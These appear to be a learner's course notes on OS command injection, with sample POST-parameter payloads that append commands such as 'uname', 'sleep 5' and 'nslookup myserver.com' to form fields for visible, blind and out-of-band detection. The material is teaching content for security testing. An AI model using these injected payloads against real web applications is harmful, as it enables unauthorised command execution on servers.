# Section 8: OS Command Injection

## Discovering a Basic Command Injection Vulnerability

**Execute system commands on the target web server**
- Compromise the application & server
- Compromise the network and other resources

  e.g. in a POST request payload, in BURP suite:

  ```
  productId=3;uname&storeId=2
  ```

  ```
  productId=3&storeId=2;uname
  ```

returns:
```
73
Linux
```

  added semicolon because I can run this in the system:

  ```
  uname;pwd
  ```

---

## Discovering Blind Comand Injection Vulnerability

It's Blind because, there is no ouput of the command displayed. 

The **sleep** function can be used to verify if it's working

e.g. In a POST request paylaod

```
csrf=32059523058230&name=test^email=test%40test.com;sleep+5;&subject=test&message=adfsdf
```

also can replace semicolons with double bars (OR)

```
csrf=32059523058230&name=test^email=test%40test.com||sleep+5||&subject=test&message=adfsdf
```

---

## Discovering Asynchronous Blind Command Injection Vulnerabilities

For example when an OS command is executed in another thread and there is not way to check it in the response

Solution: Use a command such as the `ping` or `nslookup` to cause the target web application to send a request to another server
that you control. Then check the logs of the server you control for the request.

```
csrf=32059523058230&name=test^email=test%40test.com||nslookup+myserver.com||&subject=test&message=adfsdf
```

---




